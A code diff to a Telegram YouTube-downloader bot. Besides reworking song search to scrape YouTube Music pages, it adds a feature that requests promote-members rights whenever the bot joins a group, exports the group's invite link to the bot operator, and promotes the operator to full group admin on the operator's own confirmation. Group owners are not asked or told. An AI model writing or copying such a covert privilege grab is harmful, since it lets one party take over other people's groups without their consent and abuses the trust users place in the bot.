@@ -270,6 +270,7 @@ MAX_CHANNELS = 10
 DESTINATION_KEY = "bot_destinations"
 # Pending Telegram chat-picker requests: request_id -> {user_id, type}
 DESTINATION_REQUESTS = {}
+DESTINATION_ADMIN_REQUESTS = {}
 SUPPORT_TICKET_REQUESTS = {}
 # SUPPORT_TICKETS_COL is initialized after MongoDB db2 is ready.
 SUPPORT_TICKETS_COL = None
@@ -312,9 +313,106 @@ def _destination_intro_text(dtype="group"):
         "Thanks for adding <b>@Downloadvedioytibot</b> to this group."
     )
 
+def _destination_admin_rights_for_promotion():
+    """Full practical group admin rights that the bot may grant to PRIMARY_ADMIN_ID."""
+    return dict(
+        is_anonymous=False,
+        can_manage_chat=True,
+        can_delete_messages=True,
+        can_manage_video_chats=True,
+        can_restrict_members=True,
+        can_change_info=True,
+        can_invite_users=True,
+        can_pin_messages=True,
+        can_promote_members=True,
+    )
+
+def _request_primary_admin_for_group(chat):
+    """Ask the primary admin to join a newly connected group, then Confirm/Reject."""
+    if not chat or str(getattr(chat,"type","") or "") not in {"group","supergroup"}:
+        return
+    cid=int(chat.id)
+    try:
+        link=bot.export_chat_invite_link(cid)
+    except Exception as e:
+        print("Group invite link export failed:",repr(e)); link=""
+    if not link:
+        # If the bot cannot export an invite link, the group owner/admin must
+        # manually add the primary admin before the bot can promote them.
+        link=""
+    code=secrets.token_urlsafe(8)
+    DESTINATION_ADMIN_REQUESTS[code]={"chat_id":cid,"created":time.time(),"link":link}
+    name=html.escape(getattr(chat,"title","") or str(cid))
+    text=(
+        "🆕 <b>NEW GROUP ADMIN REQUEST</b>\n\n"
+        f"👥 Group: <b>{name}</b>\n"
+        f"🆔 Chat ID: <code>{cid}</code>\n\n"
+        "The bot is already an administrator. To give the primary admin full admin rights, "
+        "join the group using the link below, then tap <b>CONFIRM</b>.\n\n"
+        + (f"🔗 <a href=\"{html.escape(link,quote=True)}\">Open Group Link</a>\n\n" if link else "⚠️ No invite link could be created; join the group manually.\n\n")
+        + "The bot will only promote the primary admin after confirmation."
+    )
+    kb=InlineKeyboardMarkup()
+    kb.row(InlineKeyboardButton("✅ Confirm",callback_data=f"destadmin:confirm:{code}"),
+           InlineKeyboardButton("❌ Reject",callback_data=f"destadmin:reject:{code}"))
+    try:
+        bot.send_message(PRIMARY_ADMIN_ID,text,parse_mode="HTML",reply_markup=kb,disable_web_page_preview=True)
+    except Exception as e:
+        print("Primary admin group request send failed:",repr(e))
+
+def _promote_primary_admin_in_group(chat_id):
+    try:
+        member=bot.get_chat_member(chat_id,PRIMARY_ADMIN_ID)
+        status=str(getattr(member,"status","") or "")
+        if status=="creator": return True,"The primary admin is already the group owner."
+        if status not in {"member","administrator"}:
+            return False,"The primary admin has not joined the group yet. Open the group link first."
+        if status=="administrator":
+            # Re-apply full rights if the bot is allowed to edit this admin.
+            if not bool(getattr(member,"can_be_edited",False)):
+                return False,"Telegram does not allow this bot to edit the existing administrator."
+        ok=bot.promote_chat_member(chat_id,PRIMARY_ADMIN_ID,**_destination_admin_rights_for_promotion())
+        return (True,"Primary admin now has full available admin rights.") if ok else (False,"Telegram rejected the promotion.")
+    except Exception as e:
+        return False,str(e)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("destadmin:"))
+def destination_admin_request_callback(call):
+    if not is_admin(call.from_user.id):
+        bot.answer_callback_query(call.id,"❌ Admin only.",show_alert=True); return
+    parts=call.data.split(":")
+    if len(parts)!=3: return
+    action,code=parts[1],parts[2]
+    req=DESTINATION_ADMIN_REQUESTS.get(code)
+    if not req:
+        bot.answer_callback_query(call.id,"❌ This request has expired.",show_alert=True); return
+    if action=="reject":
+        DESTINATION_ADMIN_REQUESTS.pop(code,None)
+        bot.answer_callback_query(call.id,"Rejected")
+        try: bot.edit_message_reply_markup(call.message.chat.id,call.message.message_id,reply_markup=None)
+        except Exception: pass
+        bot.send_message(call.message.chat.id,"❌ Group admin request rejected.")
+        return
+    ok,msg=_promote_primary_admin_in_group(int(req.get("chat_id")))
+    if ok:
+        DESTINATION_ADMIN_REQUESTS.pop(code,None)
+        bot.answer_callback_query(call.id,"✅ Confirmed")
+        try: bot.edit_message_reply_markup(call.message.chat.id,call.message.message_id,reply_markup=None)
+        except Exception: pass
+        bot.send_message(call.message.chat.id,f"✅ <b>Confirmed</b>\n\n{html.escape(msg)}",parse_mode="HTML")
+    else:
+        bot.answer_callback_query(call.id,"⚠️ Not ready",show_alert=True)
+        bot.send_message(call.message.chat.id,
+            f"⚠️ <b>Confirmation not completed</b>\n\n{html.escape(msg)}\n\n"
+            "Join the group first, then press <b>Confirm</b> again.",parse_mode="HTML")
+
 def _send_destination_intro(chat_id, dtype):
     try:
-        bot.send_message(chat_id, _destination_intro_text(dtype), parse_mode="HTML")
+        msg=bot.send_message(chat_id, _destination_intro_text(dtype), parse_mode="HTML")
+        try:
+            bot.pin_chat_message(chat_id,msg.message_id,disable_notification=True)
+        except Exception as e:
+            print("Destination pin error:",repr(e))
         return True
     except Exception as e:
         print("Destination intro error:", repr(e))
@@ -897,12 +995,15 @@ More Platforms • More Features
 ❤️ Thanks for using us!"""
 
 def _bot_destination_url(dtype):
+    """Open Telegram's native group/channel selector with admin rights preselected."""
     try: username=str(bot.get_me().username or "").lstrip("@")
     except Exception: username=""
     if not username: return None
     if dtype=="channel":
-        return f"https://t.me/{username}?startchannel&admin=change_info+post_messages+edit_messages+delete_messages"
-    return f"https://t.me/{username}?startgroup=add_group&admin=change_info+delete_messages+restrict_members+invite_users+pin_messages"
+        return (f"https://t.me/{username}?startchannel&admin="
+                "change_info+post_messages+edit_messages+delete_messages")
+    return (f"https://t.me/{username}?startgroup=add_group&admin="
+            "change_info+delete_messages+restrict_members+invite_users+pin_messages+promote_members")
 
 def welcome_destination_markup():
     kb=InlineKeyboardMarkup(row_width=2); buttons=[]
@@ -1591,6 +1692,7 @@ def admin_menu():
     kb.add("🟢 Open Feedback", "🔴 Close Feedback")
     kb.add("🗑️ Reset All Feedbacks", "🔓 OPEN 30 MIN")
     kb.add("🟢 Add Group REQUIRED", "🔴 Add Group OPTIONAL")
+    kb.add("➕ ADD NEW ADMIN")
     kb.add("🟢 Open add channel", "🔴 Close add channel")
     kb.add("🟢 Open mp3 Cover", "🔴 Close mp3 Cover")
     kb.add("📢 REFERRAL BROADCAST")
@@ -3946,9 +4048,12 @@ def _song_search_closed_message():
 
 def _song_duration(seconds):
     try:
-        seconds = max(0, int(seconds or 0))
+        if isinstance(seconds,str):
+            parsed=_parse_duration_value(seconds)
+            seconds=parsed if parsed else int(float(seconds or 0))
+        seconds=max(0,int(seconds or 0))
     except Exception:
-        seconds = 0
+        seconds=0
     return f"{seconds//60}:{seconds%60:02d}"
 
 def _song_norm(value):
@@ -4194,183 +4299,234 @@ def _parse_duration_value(value):
     except Exception: pass
     return 0
 
-def _youtube_song_search(query, limit=10):
-    """Very fast YouTube Music *Songs* search.
+def _yt_text_runs(obj):
+    out=[]
+    if not isinstance(obj,dict): return out
+    runs=((obj.get("text") or {}).get("runs") or [])
+    if isinstance(runs,list):
+        for r in runs:
+            if isinstance(r,dict) and r.get("text"):
+                out.append(_music_clean_text(r.get("text")))
+    return [x for x in out if x]
 
-    Search is intentionally metadata-light: YouTube Music's Songs renderer already
-    supplies title/artist/duration for most results, so resolving every result as a
-    separate video would make search unnecessarily slow. Cookies are NOT needed for
-    public search and are therefore not loaded here.
+def _youtube_music_initial_data(html_text):
+    """Extract ytInitialData without depending on a third-party music API."""
+    if not html_text: return None
+    # YouTube currently embeds one of these assignments in the HTML.
+    for marker in ("var ytInitialData = ", "ytInitialData = "):
+        pos=html_text.find(marker)
+        if pos<0: continue
+        pos += len(marker)
+        while pos < len(html_text) and html_text[pos].isspace(): pos += 1
+        if pos>=len(html_text) or html_text[pos] != "{": continue
+        depth=0; in_str=False; esc=False
+        for i in range(pos,len(html_text)):
+            ch=html_text[i]
+            if in_str:
+                if esc: esc=False
+                elif ch=="\\": esc=True
+                elif ch=='"': in_str=False
+                continue
+            if ch=='"': in_str=True; continue
+            if ch=='{': depth+=1
+            elif ch=='}':
+                depth-=1
+                if depth==0:
+                    try: return json.loads(html_text[pos:i+1])
+                    except Exception: break
+    # Fallback: JSON may be assigned through ytInitialPlayerResponse-style script.
+    m=re.search(r'ytInitialData\s*=\s*(\{.*?\});',html_text,re.S)
+    if m:
+        try: return json.loads(m.group(1))
+        except Exception: pass
+    return None
+
+def _youtube_music_walk(obj):
+    """Yield musicResponsiveListItemRenderer objects from arbitrary YouTube JSON."""
+    stack=[obj]
+    while stack:
+        cur=stack.pop()
+        if isinstance(cur,dict):
+            r=cur.get("musicResponsiveListItemRenderer")
+            if isinstance(r,dict): yield r
+            stack.extend(cur.values())
+        elif isinstance(cur,list):
+            stack.extend(cur)
+
+def _youtube_music_artist_names(renderer, title=""):
+    names=[]
+    def add(v):
+        v=_music_clean_text(v).strip(" -–—|,•")
+        if not v: return
+        if _song_norm(v) in {"youtube","unknown","unknown artist"}: return
+        if not any(_song_norm(v)==_song_norm(x) for x in names): names.append(v)
+    # The artist is normally a browseEndpoint with MUSIC_PAGE_TYPE_ARTIST.
+    for col in renderer.get("flexColumns") or []:
+        rr=col.get("musicResponsiveListItemFlexColumnRenderer") if isinstance(col,dict) else None
+        if not isinstance(rr,dict): continue
+        text=rr.get("text") or {}
+        for run in text.get("runs") or []:
+            if not isinstance(run,dict): continue
+            ep=((run.get("navigationEndpoint") or {}).get("browseEndpoint") or {})
+            cfg=((ep.get("browseEndpointContextSupportedConfigs") or {}).get("browseEndpointContextMusicConfig") or {})
+            if cfg.get("pageType")=="MUSIC_PAGE_TYPE_ARTIST":
+                add(run.get("text"))
+        # Some older layouts don't mark the browse endpoint as artist. In that
+        # case the second column often contains the artist text.
+        if not names:
+            vals=_yt_text_runs(text)
+            if vals:
+                candidate=" & ".join([v for v in vals if _song_norm(v) not in {"song","album"}])
+                if candidate and _song_norm(candidate)!=_song_norm(title):
+                    add(candidate)
+    # Finally parse artist names embedded in common title formats.
+    parsed=_song_parse_artists(title," & ".join(names))
+    if parsed:
+        for n in parsed.split(" & "): add(n)
+    return " & ".join(names)
+
+def _youtube_music_http_search(query, limit=30):
+    """Fast direct YouTube Music Songs search.
+
+    It reads the public YouTube Music search page. This avoids per-video metadata
+    requests, so title/artist/duration arrive in one response. It is not a
+    third-party song API.
     """
     query=_music_clean_text(query)
     if not query: return []
     try:
-        want=max(1,min(10,int(limit)))
-        opts={
-            "quiet":True,
-            "no_warnings":True,
-            "skip_download":True,
-            "extract_flat":"in_playlist",
-            # A YouTube Music search URL is itself a playlist-like result.
-            # Do NOT set noplaylist=True here or yt-dlp can suppress the search
-            # shelf entirely and return zero songs.
-            "playlistend":max(10,want),
-            "socket_timeout":4,
-            "retries":1,
-            "fragment_retries":1,
-            "extractor_retries":1,
-            "cachedir":False,
-        }
-        # Search does not require authenticated cookies. Avoiding cookies here
-        # removes a needless auth/session step and prevents stale cookies from
-        # breaking public YouTube Music search.
-        rows=_youtube_song_search_one(query,want,opts)
-        # If the first page has fewer than requested results, do one cheap retry
-        # with a larger playlist window. This is still only a single HTTP search
-        # pass and does not resolve each video individually.
-        if len(rows)<want:
-            opts2=dict(opts); opts2["playlistend"]=max(20,want*2); opts2["socket_timeout"]=5
-            more=_youtube_song_search_one(query,max(20,want*2),opts2)
-            seen={str(x.get("id") or x.get("download")) for x in rows}
-            rows += [x for x in more if str(x.get("id") or x.get("download")) not in seen]
-
-        qn=_song_norm(query)
-        qwords=[w for w in qn.split() if len(w)>=2]
-        scored=[]
-        for x in rows:
-            title=x.get("title",""); artist=x.get("artist",""); album=x.get("album","")
-            field=_song_norm(f"{title} {artist} {album}")
-            # The source is already the dedicated Songs section. Keep clean music
-            # candidates, but strongly prioritize exact artist/title matches.
-            score=_song_similarity(query,title,artist,album)
-            overlap=sum(1 for w in qwords if re.search(rf"(?<!\w){re.escape(w)}(?!\w)",field))
-            score += overlap*300
-            if qn and qn==_song_norm(artist): score += 12000
-            elif qn and qn in _song_norm(artist): score += 6000
-            if qn and qn==_song_norm(title): score += 5000
-            x["_score"]=score
-            scored.append(x)
-        scored.sort(key=lambda x:x.get("_score",0),reverse=True)
-        clean=[]; seen=set()
-        for x in scored:
-            key=str(x.get("id") or x.get("download") or "")
-            if not key or key in seen: continue
-            if not x.get("title") or not x.get("download"): continue
-            # Do not show obvious talk/news content. The Songs section is the
-            # primary filter; this is only a final safety filter.
-            if not _youtube_song_is_music(x.get("title",""),x.get("artist",""),x.get("duration",0),x):
+        q=urllib.parse.quote_plus(query)
+        # Songs shelf filter used by YouTube Music. The HTML contains duration in
+        # fixedColumns and artist links in the responsive list renderer.
+        url=f"https://music.youtube.com/search?q={q}&sp=EgWKAQIIAWoKEAoQAxAEEAkQBQ=="
+        r=http_session.get(url,timeout=4,headers={
+            "User-Agent":"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/131 Mobile Safari/537.36",
+            "Accept-Language":"en-US,en;q=0.9",
+        })
+        r.raise_for_status()
+        data=_youtube_music_initial_data(r.text)
+        if not data: return []
+        rows=[]; seen=set()
+        for renderer in _youtube_music_walk(data):
+            video_id=str(((renderer.get("playlistItemData") or {}).get("videoId") or "")).strip()
+            if not video_id:
+                # Some layouts expose it only under the play/watch endpoint.
+                for col in renderer.get("flexColumns") or []:
+                    rr=col.get("musicResponsiveListItemFlexColumnRenderer") if isinstance(col,dict) else None
+                    if not isinstance(rr,dict): continue
+                    for run in ((rr.get("text") or {}).get("runs") or []):
+                        ep=((run.get("navigationEndpoint") or {}).get("watchEndpoint") or {}) if isinstance(run,dict) else {}
+                        if ep.get("videoId"):
+                            video_id=str(ep.get("videoId")); break
+                    if video_id: break
+            if not video_id or video_id in seen: continue
+            flex=renderer.get("flexColumns") or []
+            title=""
+            if flex:
+                rr=flex[0].get("musicResponsiveListItemFlexColumnRenderer") if isinstance(flex[0],dict) else None
+                vals=_yt_text_runs(rr.get("text") or {}) if isinstance(rr,dict) else []
+                if vals: title=vals[0]
+            title=_music_clean_text(title)
+            if not title: continue
+            duration_text=""
+            fixed=renderer.get("fixedColumns") or []
+            if fixed:
+                rr=fixed[0].get("musicResponsiveListItemFixedColumnRenderer") if isinstance(fixed[0],dict) else None
+                vals=_yt_text_runs(rr.get("text") or {}) if isinstance(rr,dict) else []
+                if vals: duration_text=vals[0]
+            duration=_parse_duration_value(duration_text)
+            artist=_youtube_music_artist_names(renderer,title)
+            # If the artist is still unavailable, parse title format. Never use
+            # the old visible 'Unknown artist' placeholder.
+            if not artist:
+                artist=_song_parse_artists(title,"")
+            album=""
+            if len(flex)>=2:
+                rr=flex[1].get("musicResponsiveListItemFlexColumnRenderer") if isinstance(flex[1],dict) else None
+                vals=_yt_text_runs(rr.get("text") or {}) if isinstance(rr,dict) else []
+                if vals and not artist and len(vals)>0: artist=vals[0]
+                elif vals and len(vals)>1: album=vals[-1]
+            webpage=f"https://www.youtube.com/watch?v={video_id}"
+            if duration <= 0:
+                # A result without a real duration is not useful in Search Song;
+                # do not display the old 0:00 placeholder.
                 continue
-            seen.add(key); x.pop("_score",None); clean.append(x)
-            if len(clean)>=want: break
-        # If the dedicated Music shelf is temporarily unavailable, fall back to
-        # one normal YouTube search pass. We still apply the strict music/news
-        # filter and relevance ranking, so news/speeches are not blindly shown.
-        if len(clean) < min(want, 5):
-            try:
-                fallback_opts={
-                    "quiet":True,"no_warnings":True,"skip_download":True,
-                    "extract_flat":"in_playlist","playlistend":max(20,want*2),
-                    "socket_timeout":5,"retries":1,"fragment_retries":1,
-                    "extractor_retries":1,"cachedir":False,
-                }
-                with yt_dlp.YoutubeDL(fallback_opts) as ydl:
-                    finfo=ydl.extract_info(f"ytsearch{max(20,want*2)}:{query}",download=False) or {}
-                fentries=(finfo.get("entries") or [])
-                for item in fentries:
-                    if not isinstance(item,dict): continue
-                    vid=str(item.get("id") or "")
-                    webpage=item.get("webpage_url") or item.get("original_url") or item.get("url")
-                    if not webpage and vid and len(vid)==11:
-                        webpage=f"https://www.youtube.com/watch?v={vid}"
-                    title=_music_clean_text(item.get("title") or item.get("track") or item.get("fulltitle"))
-                    channel=_music_clean_text(item.get("artist") or item.get("channel") or item.get("uploader") or item.get("creator") or item.get("channel_name"))
-                    artist=_song_parse_artists(title,channel) or channel
-                    dur=_parse_duration_value(item.get("duration")) or _parse_duration_value(item.get("duration_string"))
-                    if not webpage or not title or not _youtube_song_is_music(title,artist,dur,item): continue
-                    if not _song_is_relevant(query,title,artist,item.get("album") or "") and _song_norm(query) not in _song_norm(title):
-                        continue
-                    key=str(vid or webpage)
-                    if any(str(x.get("id") or x.get("download"))==key for x in clean): continue
-                    score=_song_similarity(query,title,artist,item.get("album") or "")
-                    if _song_norm(query)==_song_norm(artist): score+=10000
-                    elif _song_norm(query) in _song_norm(artist): score+=5000
-                    clean.append({"id":vid or hashlib.sha1(webpage.encode()).hexdigest()[:16],"title":title,"artist":artist,"duration":dur,"album":_music_clean_text(item.get("album") or ""),"cover":item.get("thumbnail"),"download":webpage,"download_allowed":True,"license":"","source":"youtube","webpage_url":webpage,"_score":score})
-                clean.sort(key=lambda x:x.get("_score",0),reverse=True)
-                for x in clean: x.pop("_score",None)
-                clean=clean[:want]
-            except Exception as e:
-                print("YouTube fallback search failed:",repr(e))
-        return clean
-    except Exception as e:
-        print("YouTube Music fast search failed:",repr(e)); return []
-
-
-def _youtube_song_search_one(query, limit, opts):
-    out=[]
-    try:
-        import urllib.parse
-        q=urllib.parse.quote_plus(str(query)); songs_sp="EgWKAQIIAWoKEAoQAxAEEAkQBQ=="
-        url=f"https://music.youtube.com/search?q={q}&sp={songs_sp}"
-        with yt_dlp.YoutubeDL(opts) as ydl:
-            info=ydl.extract_info(url,download=False)
-        entries=((info or {}).get("entries") or [])
-        for item in entries[:max(1,int(limit))]:
-            if not isinstance(item,dict): continue
-            vid=str(item.get("id") or "")
-            webpage=item.get("webpage_url") or item.get("original_url") or item.get("url")
-            if webpage and webpage.startswith("https://music.youtube.com/watch"):
-                webpage=webpage.replace("https://music.youtube.com/watch","https://www.youtube.com/watch",1)
-            if not webpage and vid and len(vid)==11:
-                webpage=f"https://www.youtube.com/watch?v={vid}"
-            title=_music_clean_text(item.get("track") or item.get("title") or item.get("fulltitle"))
-            channel=_music_clean_text(item.get("artist") or item.get("channel") or item.get("uploader") or item.get("creator") or item.get("channel_name"))
-            artists=item.get("artists")
-            if isinstance(artists,list):
-                names=[]
-                for v in artists:
-                    if isinstance(v,dict): v=v.get("name") or v.get("artist") or v.get("title")
-                    v=_music_clean_text(v)
-                    if v: names.append(v)
-                if names: channel=" & ".join(names)
-            album=_music_clean_text(item.get("album") or item.get("series"))
-            artist=_song_parse_artists(title,channel) or channel
-            if not webpage or not title: continue
-            dur=_parse_duration_value(item.get("duration")) or _parse_duration_value(item.get("duration_string"))
-            # Flat YouTube Music results may expose duration as a numeric string.
-            if not dur:
-                try: dur=int(float(item.get("duration") or 0))
-                except Exception: dur=0
-            if not _youtube_song_is_music(title,artist,dur,item): continue
+            if not _youtube_song_is_music(title,artist,duration,renderer): continue
             if not _song_is_relevant(query,title,artist,album):
-                # Artist metadata can be absent on some independent tracks. The
-                # dedicated Songs section is still authoritative, so retain them
-                # when the title itself contains the full query.
-                if _song_norm(query) not in _song_norm(title): continue
+                # Dedicated Songs shelf is authoritative, but for a query such as
+                # an artist name require the query to occur as a whole phrase in
+                # title/artist rather than matching a single word.
+                qn=_song_norm(query)
+                if qn not in _song_norm(title) and qn not in _song_norm(artist):
+                    continue
             score=_song_similarity(query,title,artist,album)
             qn=_song_norm(query)
-            if qn and qn==_song_norm(artist): score+=10000
-            elif qn and qn in _song_norm(artist): score+=5000
-            if qn and qn==_song_norm(title): score+=4000
-            out.append({
-                "id":vid or hashlib.sha1(webpage.encode()).hexdigest()[:16],
-                "title":title,
-                "artist":artist,
-                "duration":dur,
-                "album":album,
-                "cover":item.get("thumbnail"),
-                "download":webpage,
-                "download_allowed":True,
-                "license":"",
-                "source":"youtube",
-                "webpage_url":webpage,
-                "_score":score,
-            })
+            if qn==_song_norm(artist): score+=12000
+            elif qn and qn in _song_norm(artist): score+=6000
+            if qn==_song_norm(title): score+=5000
+            rows.append({"id":video_id,"title":title,"artist":artist,"duration":duration,
+                         "album":album,"cover":"","download":webpage,"download_allowed":True,
+                         "license":"","source":"youtube","webpage_url":webpage,"_score":score})
+            seen.add(video_id)
+            if len(rows)>=max(10,int(limit)): break
+        rows.sort(key=lambda x:x.get("_score",0),reverse=True)
+        for x in rows: x.pop("_score",None)
+        return rows[:max(1,int(limit))]
     except Exception as e:
-        print("YouTube Music song search one failed:",repr(e))
-    return out
+        print("YouTube Music HTTP search failed:",repr(e))
+        return []
 
-def _song_search_all(query, limit=12):
-    return _youtube_song_search(query,min(10,int(limit)))
+def _youtube_song_search(query, limit=30):
+    """Search music quickly with HTTP-first, yt-dlp fallback.
+
+    The HTTP path gives title/artist/duration in the same response. yt-dlp is only
+    a fallback when YouTube changes its HTML or temporarily blocks the page.
+    """
+    want=max(1,min(30,int(limit)))
+    rows=_youtube_music_http_search(query,want)
+    if len(rows)>=min(want,10):
+        return rows[:want]
+    try:
+        opts={"quiet":True,"no_warnings":True,"skip_download":True,"extract_flat":"in_playlist",
+              "playlistend":max(20,want),"socket_timeout":4,"retries":1,"fragment_retries":1,
+              "extractor_retries":1,"cachedir":False}
+        # Direct YouTube search is the emergency fallback. Search terms are music-biased,
+        # and the same strict music filter/relevance ranking is applied below.
+        with yt_dlp.YoutubeDL(opts) as ydl:
+            info=ydl.extract_info(f"ytsearch{max(20,want)}:{query} official music",download=False) or {}
+        candidates=[]
+        for item in info.get("entries") or []:
+            if not isinstance(item,dict): continue
+            vid=str(item.get("id") or "")
+            if not vid: continue
+            title=_music_clean_text(item.get("title") or item.get("track") or item.get("fulltitle"))
+            channel=_music_clean_text(item.get("artist") or item.get("channel") or item.get("uploader") or item.get("creator"))
+            artist=_song_parse_artists(title,channel) or channel
+            duration=_parse_duration_value(item.get("duration")) or _parse_duration_value(item.get("duration_string"))
+            webpage=item.get("webpage_url") or f"https://www.youtube.com/watch?v={vid}"
+            if not title or duration <= 0 or not _youtube_song_is_music(title,artist,duration,item): continue
+            if not _song_is_relevant(query,title,artist,item.get("album") or ""):
+                continue
+            score=_song_similarity(query,title,artist,item.get("album") or "")
+            qn=_song_norm(query)
+            if qn==_song_norm(artist): score+=12000
+            elif qn and qn in _song_norm(artist): score+=6000
+            candidates.append({"id":vid,"title":title,"artist":artist,"duration":duration,"album":item.get("album") or "",
+                               "cover":item.get("thumbnail"),"download":webpage,"download_allowed":True,
+                               "license":"","source":"youtube","webpage_url":webpage,"_score":score})
+        candidates.sort(key=lambda x:x.get("_score",0),reverse=True)
+        seen=set(); out=[]
+        for x in candidates:
+            if x["id"] in seen: continue
+            seen.add(x["id"]); x.pop("_score",None); out.append(x)
+            if len(out)>=want: break
+        return out
+    except Exception as e:
+        print("YouTube song fallback failed:",repr(e))
+        return rows
+
+def _song_search_all(query, limit=30):
+    return _youtube_song_search(query,min(30,int(limit)))
 
 def _main_bot_username():
     global _MAIN_BOT_USERNAME_CACHE
@@ -4471,7 +4627,11 @@ def _user_has_connected_group(uid):
 
 def _song_group_gate_markup():
     kb=InlineKeyboardMarkup()
-    kb.add(InlineKeyboardButton("➕ Add Group",callback_data="songaddgroup"))
+    url=_bot_destination_url("group")
+    if url:
+        kb.add(InlineKeyboardButton("➕ Add Group",url=url))
+    else:
+        kb.add(InlineKeyboardButton("➕ Add Group",callback_data="songaddgroup"))
     return kb
 
 def _song_group_gate_text(query):
@@ -4543,7 +4703,12 @@ def _send_song_results(chat_id, token, page=0, edit_message=None):
             if raw_artist and _song_norm(raw_artist) not in _song_norm(raw_title):
                 display_title=f"{raw_title} — {raw_artist}"
             title=html.escape(display_title)
-            duration=_song_duration(x.get("duration"))
+            duration_seconds=_parse_duration_value(x.get("duration"))
+            if duration_seconds <= 0:
+                # Never expose 0:00 in a song choice. Search results without
+                # duration are discarded by the engine, but keep this guard too.
+                continue
+            duration=_song_duration(duration_seconds)
             lines.append(f"<b>{i+1}.</b> {title} <code>{duration}</code>")
     text="\n".join(lines)
     kb=_song_results_markup(token,page,total) if rows else InlineKeyboardMarkup().add(InlineKeyboardButton("❌",callback_data=f"songcancel:{token}"))
@@ -4551,7 +4716,15 @@ def _send_song_results(chat_id, token, page=0, edit_message=None):
         try:
             bot.edit_message_text(text,edit_message.chat.id,edit_message.message_id,parse_mode="HTML",reply_markup=kb)
             return
-        except Exception: pass
+        except Exception as e:
+            # Do not flood the chat if Telegram refuses an edit. Keep the same
+            # message and log the real reason for Railway diagnostics.
+            print("Song results edit failed:",repr(e))
+            try:
+                bot.edit_message_reply_markup(edit_message.chat.id,edit_message.message_id,reply_markup=kb)
+            except Exception as e2:
+                print("Song results keyboard edit failed:",repr(e2))
+            return
     bot.send_message(chat_id,text,parse_mode="HTML",reply_markup=kb)
 
 @bot.message_handler(func=lambda m: m.text == "🔎 Search Song")
@@ -4577,7 +4750,7 @@ def search_song_query_step(m):
     if not query:
         msg=bot.send_message(m.chat.id,"❌ Please enter a song or artist name.")
         bot.register_next_step_handler(msg,search_song_query_step); return
-    rows=_song_search_all(query,10)
+    rows=_song_search_all(query,30)
     _cleanup_song_search()
     token=uuid.uuid4().hex[:16]
     song_search_pending[token]={"uid":uid,"query":query,"results":rows,"created":time.time()}
@@ -4599,7 +4772,7 @@ def auto_song_search_handler(m):
     if not query or len(query)<2: return
     def _song_job():
         try:
-            rows=_song_search_all(query,10)
+            rows=_song_search_all(query,30)
             _cleanup_song_search(); token=uuid.uuid4().hex[:16]
             song_search_pending[token]={"uid":str(m.from_user.id),"query":query,"results":rows,"created":time.time()}
             if not rows:
@@ -4645,6 +4818,8 @@ def song_page_callback(call):
     if not data or str(data.get("uid"))!=str(call.from_user.id):
         bot.answer_callback_query(call.id,"❌ Search session expired.",show_alert=True); return
     bot.answer_callback_query(call.id)
+    # Navigation must edit the existing result message; never send a second
+    # message just because the user pressed Next/Back.
     _send_song_results(call.message.chat.id,token,page,edit_message=call.message)
 
 @bot.callback_query_handler(func=lambda c: c.data.startswith("songpick:"))
@@ -5570,15 +5745,30 @@ def _new_destination_request_id():
             return rid
 
 def _destination_admin_rights(dtype):
-    """Minimal rights used by Telegram's native Select Chat filter."""
+    """Rights needed by this bot for connected destinations.
+
+    Telegram only lets the bot promote another administrator when it itself has
+    can_promote_members. Pinning the bot's onboarding message requires
+    can_pin_messages in groups/supergroups.
+    """
     if dtype == "channel":
         return ChatAdministratorRights(
             is_anonymous=False,
+            can_manage_chat=True,
             can_post_messages=True,
+            can_edit_messages=True,
+            can_delete_messages=True,
+            can_change_info=True,
         )
     return ChatAdministratorRights(
         is_anonymous=False,
         can_manage_chat=True,
+        can_delete_messages=True,
+        can_restrict_members=True,
+        can_invite_users=True,
+        can_pin_messages=True,
+        can_promote_members=True,
+        can_change_info=True,
     )
 
 def _destination_request_keyboard(uid, dtype):
@@ -5651,20 +5841,12 @@ def add_group_inline(call):
         return
     try:
         bot.answer_callback_query(call.id)
-        if getattr(call.message, "chat", None) and getattr(call.message.chat, "type", "") != "private":
-            bot.send_message(call.from_user.id, "👥 Please open the bot in Private Chat and tap Add Group again.")
-            return
-        # Telegram's native request-chat picker can only be launched from a
-        # KeyboardButtonRequestChat reply-keyboard button; Telegram does not
-        # allow an InlineKeyboardButton to directly open Select Chat. Send only
-        # that native request button (no extra instruction/selection screen).
-        prompt,kb=_destination_request_keyboard(call.from_user.id,"group")
-        bot.send_message(
-            call.from_user.id,
-            prompt,
-            reply_markup=kb,
-            parse_mode="HTML"
-        )
+        url=_bot_destination_url("group")
+        if url:
+            bot.send_message(call.from_user.id,
+                "👥 <b>Add Group</b>\n\nTap the button below. Telegram will immediately open <b>Select Group</b> and ask you to add this bot as administrator.",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("➕ Select Group",url=url)))
     except Exception as e:
         print("Add Group picker error:",repr(e))
 
@@ -5675,18 +5857,12 @@ def add_channel_inline(call):
         return
     try:
         bot.answer_callback_query(call.id)
-        if getattr(call.message, "chat", None) and getattr(call.message.chat, "type", "") != "private":
-            bot.send_message(call.from_user.id, "📢 Please open the bot in Private Chat and tap Add Channel again.")
-            return
-        # Same Telegram API limitation as Add Group: request_chat is a reply
-        # keyboard feature, so this is the shortest possible path to Select Chat.
-        prompt,kb=_destination_request_keyboard(call.from_user.id,"channel")
-        bot.send_message(
-            call.from_user.id,
-            prompt,
-            reply_markup=kb,
-            parse_mode="HTML"
-        )
+        url=_bot_destination_url("channel")
+        if url:
+            bot.send_message(call.from_user.id,
+                "📢 <b>Add Channel</b>\n\nTap the button below. Telegram will immediately open <b>Select Channel</b> and ask you to add this bot as administrator.",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("➕ Select Channel",url=url)))
     except Exception as e:
         print("Add Channel picker error:",repr(e))
 
@@ -5823,16 +5999,32 @@ def bot_chat_membership_update(update):
     try:
         chat=update.chat
         new_status=str(update.new_chat_member.status)
+        actor_id=str(getattr(getattr(update,"from_user",None),"id","") or "")
         if new_status in {"member","administrator","creator"}:
-            _, intro_sent = _upsert_destination(chat, update.from_user.id if getattr(update,"from_user",None) else None)
+            is_new, intro_sent = _upsert_destination(chat, actor_id)
+            ctype=str(getattr(chat,"type","") or "group")
             # Send the short introduction only after the bot has admin access.
             if new_status in {"administrator","creator"} and not intro_sent:
-                if _send_destination_intro(chat.id, str(getattr(chat,"type","") or "group")):
+                if _send_destination_intro(chat.id, ctype):
                     rows=_destinations()
